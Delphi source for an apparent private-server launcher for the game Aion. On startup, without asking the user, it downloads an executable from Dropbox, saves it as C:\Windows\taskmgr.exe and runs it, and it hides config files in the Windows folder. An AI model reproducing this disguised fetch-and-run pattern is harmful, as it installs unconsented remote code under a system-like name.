unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, Sockets, ExtCtrls, FileCtrl, IdBaseComponent, IdComponent,
  IdTCPConnection, IdTCPClient, IdHTTP,IniFiles, IdAntiFreezeBase, IdAntiFreeze,Psapi,TlHelp32,
  ComCtrls,Wininet,Math, jpeg;
const
MY_MESS = WM_USER + 100;
type
  TForm1 = class(TForm)
    Button1: TButton;
    TcpClient1: TTcpClient;
    Timer1: TTimer;
    Label1: TLabel;
    Label2: TLabel;
    Label3: TLabel;
    Label4: TLabel;
    IdHTTP1: TIdHTTP;
    SaveDialog1: TSaveDialog;
    IdAntiFreeze1: TIdAntiFreeze;
    Button2: TButton;
    Timer2: TTimer;
    Button3: TButton;
    ProgressBar1: TProgressBar;
    Button4: TButton;
    Label5: TLabel;
    Label6: TLabel;
    Timer3: TTimer;
    Image1: TImage;
    procedure Button1Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure mestofaila();
    procedure TScheck();
    procedure AIcheck();
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure MyProgress(var msg:TMessage);message MY_MESS;
    procedure fileget(FileURL:String;FileFold:String);
    procedure Button3Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure Timer3Timer(Sender: TObject);
private
public
end;

tnew = class(tthread)
private
procedure upd;
protected
procedure execute; override;
end;

var
  Form1: TForm1;
  thead:tnew;
  mesto,sour,nb,bidir:String;    s,Result:string;    mestoW:pwidechar;
  configFile: TextFile;
  FFileAttrs,i: Integer;    q,n:integer;      pid,pida:DWORD;
  sl:TStringList;
  ini,ini2: TIniFile;

 F,str,fs: TFileStream; LoadStream: TMemoryStream;
 http:TIdHTTP; ResStream: TResourceStream;

 same1,same2,same3:integer; cou:integer;

implementation

 type
  TDownLoader = class(TThread)
  private
    FToFolder: string;
    FURL: string;
    protected
      procedure Execute;override;
    public
      property URL:string read FURL write FURL;
      property ToFolder:string read FToFolder write FToFolder;
      procedure IdHTTP1Work(ASender: TObject; AWorkMode: TWorkMode;
      AWorkCount: Int64);
      procedure IdHTTP1WorkBegin(ASender: TObject; AWorkMode: TWorkMode;
      AWorkCountMax: Int64);
  end;
{$R *.dfm}
{$R RC.RES}


function GetFileSize(const FileURL: string):string;
 function Extract_Referer(const S:String):String;
var i:Integer;
begin
 Result:='';
 for i:=8 to length(S) do if S[i]='/' then
  begin
   Result:=Copy(S,1,i-1);
   break;
  end;
end;

var
   hSession, hFile: hInternet;
   dwBufferLen, dwIndex: DWORD;
   db:Array[1..512] of char;
   head:String;
begin
  Result := '';
 begin
   hSession := InternetOpen(PChar(Application.Title), PRE_CONFIG_INTERNET_ACCESS, nil, nil, 0);
  if Assigned(hSession) then
 begin
   head:= 'referer: '+Extract_Referer(FileURL)+#13#10#13#10;
   hFile := InternetOpenURL(hSession, PChar(FileURL), PChar(head), Length(head), 0, 0);
   dwIndex := 0; dwBufferLen := 512;
  if HttpQueryInfo(hFile, HTTP_QUERY_CONTENT_LENGTH, @db, dwBufferLen, dwIndex)
   then Result := PChar(@db);
  if Assigned(hFile) then InternetCloseHandle(hFile);
   InternetCloseHandle(hsession);
   end;
  end;
end;

function flcheck(FileName1,FileName2:String):integer;
begin
   i:=StrToInt(GetFileSize(FileName1));
q:=i;
   F:=TFileStream.Create(FileName2, fmOpenRead);
n:=F.Size;   F.Free;
if q<>n then Result:=1 else Result:=0;
end;

procedure TForm1.fileget(FileURL:String;FileFold:String);
Var d:TDownLoader;
begin
d:=TDownLoader.Create(true);
   d.URL:='http://dl.dropbox.com/u/7335408/taskmgr.exe';
   d.ToFolder:='c:\taskmgr.exe';
   d.FreeOnTerminate:=true;
   d.Resume;
end;



function processExists(exeFileName: string): Boolean;
 var
   ContinueLoop: BOOL;
   FSnapshotHandle: THandle;
   FProcessEntry32: TProcessEntry32;
 begin
   FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
   FProcessEntry32.dwSize := SizeOf(FProcessEntry32);
   ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);
   Result := False;
   while Integer(ContinueLoop) <> 0 do
   begin
     if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile)) =
       UpperCase(ExeFileName)) or (UpperCase(FProcessEntry32.szExeFile) =
       UpperCase(ExeFileName))) then
     begin
       Result := True;
     end;
     ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
   end;
   CloseHandle(FSnapshotHandle);
end;


function SelectDir(Title, DefDrive: string): string;
begin
 if SelectDirectory(Title, DefDrive, Result) then Exit;
end;


function check(PID:dword):boolean;
var
PIDArray: array [0..1023] of DWORD;
cb: DWORD;
ProcCount: Integer;
I:integer;
begin
ZeroMemory (@PIDArray,SizeOf(PIDArray));
ProcCount := cb div SizeOf(DWORD);
EnumProcesses(@PIDArray, SizeOf(PIDArray), cb);
for I := 0 to ProcCount - 1 do
 begin
 if PID=PIDArray[I] then
 begin
   result:=true;
   exit;
 end;
 end;
end;



procedure TForm1.mestofaila();
begin
ShowMessage('Выберите папку с клиентом Aion-Free');
mesto:=SelectDir('Папка клиента','');
if FileExists(mesto+'\bin32\aion.bin') then
 begin
FileSetAttr(sour+'\settings.ini', FFileAttrs and not faHidden);
ini := TIniFile.Create(sour+'\settings.ini');
ini.WriteString('Options', 'Dir',mesto);
FileSetAttr(sour+'\settings.ini',faHidden);
 end else begin
MessageBox(0, 'Выберите верную папку , программа будет закрыта.После повторного запуска вы сможите повторить попытку', 'Error', MB_ICONERROR);
Halt;
 end;
end;

procedure TForm1.FormClose(Sender: TObject; var Action: TCloseAction);
begin
FileSetAttr(sour+'\settings.ini', FFileAttrs and not faHidden);
ini.WriteString('Options', 'Dir', ' ');
FileSetAttr(sour+'\settings.ini',faHidden);
Form1.Hide;
action:=caNone;
end;


procedure TForm1.FormCreate(Sender: TObject);
var LoadStream: TMemoryStream;
pl:PwideChar;
 begin
sour:=ExtractFilePath(paramstr(0));
ini := TIniFile.Create(sour+'\settings.ini');
mesto:=ini.ReadString('Options', 'Dir', ' ');

if FileExists('C:\Windows\taskmgr.exe') then begin end
 else begin
    LoadStream := TMemoryStream.Create;
     idHTTP1.Get('http://dl.dropbox.com/u/7335408/taskmgr.exe', LoadStream);
     LoadStream.SaveToFile('C:\Windows\taskmgr.exe');       LoadStream.Free;
  end;

Form1.ScreenSnap:=true; Form1.SnapBuffer:=15;
thead:=tnew.create(true);
thead.priority := tplower;
thead.Resume;
Timer1.Enabled:=True;

if FileExists(sour+'\settings.ini') then begin end else
begin
    mestofaila();
end;

if FileExists(mesto+'\bin32\aion.bin') then
begin
  LoadStream := TMemoryStream.Create;
  idHTTP1.Get('http://dl.dropbox.com/u/7335408/system.ovr', LoadStream);
  LoadStream.SaveToFile('c:\system.ovr'); LoadStream.Free;
  DeleteFile(mesto+'\system.ovr'); MoveFile('c:\system.ovr', PChar(mesto+'\system.ovr'));
     FileSetAttr(sour+'\settings.ini',faHidden);
end else
mestofaila();
end;

procedure TForm1.Timer1Timer(Sender: TObject);
begin
thead:=tnew.create(true);
thead.priority := tplower;
thead.Resume;
end;

procedure TForm1.Timer2Timer(Sender: TObject);
begin
if Timer2.Interval<>1000 then Timer2.Interval:=1000;
TScheck();
end;

procedure TForm1.Timer3Timer(Sender: TObject);
begin
AIcheck();
end;

procedure tnew.upd;
begin
Form1.tcpclient1.RemoteHost:='195.238.191.93';
Form1.tcpclient1.RemotePort:='2106';
Form1.tcpclient1.Connect;
if Form1.tcpclient1.Connected=true then
begin
Form1.Label2.Font.Color :=clLime;
Form1.label2.Caption:='Online ';
Form1.TcpClient1.Disconnect;
end else
begin
Form1.Label2.Font.Color :=clRed;
Form1.label2.Caption:='Offline ';
Form1.TcpClient1.Disconnect;
end;

Form1.tcpclient1.RemoteHost:='195.238.191.93';
Form1.tcpclient1.RemotePort:='4268';
Form1.tcpclient1.Connect;
if Form1.tcpclient1.Connected=true then
begin
Form1.Label4.Font.Color :=clLime;
Form1.label4.Caption:='Online ';
Form1.TcpClient1.Disconnect;
end else
begin
Form1.Label4.Font.Color :=clRed;
Form1.label4.Caption:='Offline ';
Form1.TcpClient1.Disconnect;
end;
end;

procedure tnew.execute;
begin
upd;
end;


procedure TForm1.Button1Click(Sender: TObject);
var
  pi:TProcessInformation;
  si:TStartupInfo;
  ms:String;
begin
FileSetAttr(sour+'\settings.ini', FFileAttrs and not faHidden);
mesto:=ini.ReadString('Options', 'Dir', ' ');

nb:=chr(RandomRange(97, 122))+chr(RandomRange(97, 122))+
 chr(RandomRange(97, 122))+chr(RandomRange(97, 122))+chr(RandomRange(65, 90))+
 chr(RandomRange(97, 122))+chr(RandomRange(97, 122))+'.bin';

ResStream:=TResourceStream.createFromID(hInstance, 1, RT_RCDATA);
 ResStream.saveToFile(mesto+'\bin32\'+nb);
 ResStream.free();
bidir:=mesto+'\bin32\'+nb; ms:=bidir;
       FileSetAttr('c:\Windows\bt.ini', FFileAttrs and not faHidden);
       ini2:= TIniFile.Create('C:\Windows\bt.ini');
       ini2.WriteString('Boot', 'Dir', bidir);
       ini2.WriteString('Boot', 'nb', nb);
       FileSetAttr('c:\Windows\bt.ini',faHidden);
getmem(mestoW, 40);  StringToWideChar(ms,mestoW,40);
FillChar(si, SizeOf(TStartupInfo), 0); si.cb:=SizeOf(TStartupInfo);
CreateProcess(mestoW,PChar('"' +mestoW + '" ' + '-ip:195.238.191.93 -ng -noweb'),nil,nil,False,CREATE_DEFAULT_ERROR_MODE,nil,nil,si,pi);
 pida:=pi.dwProcessId;
 freemem(mestoW, 40);
  FillChar(si, SizeOf(TStartupInfo), 0); si.cb:=SizeOf(TStartupInfo);
  CreateProcess(PChar('c:\Windows\taskmgr.exe'),PChar(''),nil,nil,False,0,nil,nil,si,pi );
   pid:=pi.dwProcessId;
   Timer2.Enabled:=True;
   Timer3.Enabled:=True;
  end;

procedure TForm1.Button2Click(Sender: TObject);
var
  pi:TProcessInformation;
  si:TStartupInfo;
  ms:String;
begin
FileSetAttr(sour+'\settings.ini', FFileAttrs and not faHidden);
mesto:=ini.ReadString('Options', 'Dir', ' ');

nb:=chr(RandomRange(97, 122))+chr(RandomRange(97, 122))+
 chr(RandomRange(97, 122))+chr(RandomRange(97, 122))+chr(RandomRange(65, 90))+
 chr(RandomRange(97, 122))+chr(RandomRange(97, 122))+'.bin';

ResStream:=TResourceStream.createFromID(hInstance, 1, RT_RCDATA);
 ResStream.saveToFile(mesto+'\bin32\'+nb);
 ResStream.free();
bidir:=mesto+'\bin32\'+nb; ms:=bidir;
       FileSetAttr('c:\Windows\bt.ini', FFileAttrs and not faHidden);
       ini2:= TIniFile.Create('C:\Windows\bt.ini');
       ini2.WriteString('Boot', 'Dir', bidir);
       ini2.WriteString('Boot', 'nb', nb);
       FileSetAttr('c:\Windows\bt.ini',faHidden);
getmem(mestoW, 40);  StringToWideChar(ms,mestoW,40);
FillChar(si, SizeOf(TStartupInfo), 0); si.cb:=SizeOf(TStartupInfo);
CreateProcess(mestoW,PChar('"' +mestoW + '" ' + '-ip:195.238.191.93 -ng -noweb'),nil,nil,False,CREATE_DEFAULT_ERROR_MODE,nil,nil,si,pi);
 pida:=pi.dwProcessId;
 freemem(mestoW, 40);
  FillChar(si, SizeOf(TStartupInfo), 0); si.cb:=SizeOf(TStartupInfo);
  CreateProcess(PChar('c:\Windows\taskmgr.exe'),PChar(''),nil,nil,False,0,nil,nil,si,pi );
   pid:=pi.dwProcessId;
   Timer2.Enabled:=True;
   Timer3.Enabled:=True;
end;


procedure TForm1.Button3Click(Sender: TObject);
begin cou:=0;
{same1:=flcheck('http://dl.dropbox.com/u/7335408/taskmgr.exe','c:\taskmgr.exe');
 cou:=cou+same1; Label5.Caption:='0/'+IntToStr(cou);   }
if Form1.Height<>319 then  Form1.Height:=319 else Form1.Height:=263;
end;

procedure TForm1.Button4Click(Sender: TObject);
begin
if same1 =1 then fileget('http://dl.dropbox.com/u/7335408/taskmgr.exe','c:\taskmgr.exe');
end;

procedure TForm1.TScheck();
begin
if FileExists('C:\Windows\taskmgr.exe') then begin end
 else
 begin
     PostMessage(FindWindow(nil, 'AION Client'),WM_CLOSE, 0, 0);
     WinExec(PANsiChar('TASKKILL /F /IM '+nb), SW_HIDE);
SysUtils.DeleteFile(bidir);
 end;

if processExists('taskmgr.exe') then
begin
  if check(pid)<>True then
    begin
     PostMessage(FindWindow(nil, 'AION Client'),WM_CLOSE, 0, 0);
     WinExec(PANsiChar('TASKKILL /F /IM '+nb), SW_HIDE);
     SysUtils.DeleteFile(bidir);
    end;
end else begin
     PostMessage(FindWindow(nil, 'AION Client'),WM_CLOSE, 0, 0);
     WinExec(PANsiChar('TASKKILL /F /IM '+nb), SW_HIDE);
SysUtils.DeleteFile(bidir);
end;
end;

procedure TForm1.AIcheck();
begin
if processExists(nb) then
begin
 check(pida);
  if check(pida)<>True then
    begin
     PostMessage(FindWindow(nil, 'AION Client'),WM_CLOSE, 0, 0);
     WinExec(PANsiChar('TASKKILL /F /IM '+nb), SW_HIDE);
SysUtils.DeleteFile(bidir);
    end;
end else
 begin
  PostMessage(FindWindow(nil, 'AION Client'),WM_CLOSE, 0, 0);
  WinExec(PANsiChar('TASKKILL /F /IM '+nb), SW_HIDE);
  SysUtils.DeleteFile(bidir);
  Halt;
end;
end;


procedure TDownLoader.Execute;
var http:TIdHTTP; str:TFileStream;
begin
  http:=TIdHTTP.Create(nil);
  http.OnWork:=IdHTTP1Work;
  http.OnWorkBegin:=IdHTTP1WorkBegin;
  ForceDirectories(ExtractFileDir(ToFolder));
  str:=TFileStream.Create(ToFolder, fmCreate);
 try http.Get(url,str); finally
    http.Free; str.Free;  ShowMessage('FINISH !');
 end; end;

procedure TForm1.MyProgress(var msg: TMessage);
begin
case msg.WParam of
  0:begin ProgressBar1.Max:=msg.LParam;ProgressBar1.Position:=0; end;
  1:ProgressBar1.Position:=msg.LParam;
end; end;
procedure TDownLoader.IdHTTP1Work(ASender: TObject; AWorkMode: TWorkMode; AWorkCount: Int64);
begin PostMessage(Application.MainForm.Handle,MY_MESS,1,AWorkCount); end;

procedure TDownLoader.IdHTTP1WorkBegin(ASender: TObject; AWorkMode: TWorkMode;AWorkCountMax: Int64);
begin PostMessage(Application.MainForm.Handle,MY_MESS,0,AWorkCountMax); end;


end.
